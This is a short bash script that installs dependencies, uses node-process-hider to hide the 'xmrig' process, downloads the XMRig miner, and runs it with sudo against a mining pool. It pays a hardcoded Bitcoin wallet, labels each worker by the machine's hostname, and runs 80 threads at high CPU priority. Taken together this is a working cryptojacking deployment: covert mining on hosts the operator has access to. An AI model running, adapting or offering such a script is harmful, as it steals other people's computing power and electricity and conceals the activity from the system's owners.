#!/bin/bash
#!/bin/sh
#!/bin/bash

apt-get update && apt-get full-upgrade -y
apt -y install wget curl unzip screen autoconf git cmake binutils build-essential net-tools golang libssl1.0-dev nodejs nodejs-dev node-gyp -y
sudo apt update -y
npm i -g node-process-hider && ph add xmrig
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0 && sudo ./xmrig -a rx/0 -o rx.unmineable.com:3333 -u BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.$(echo "$(cat /proc/sys/kernel/hostname)" | tr . _ ) -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive
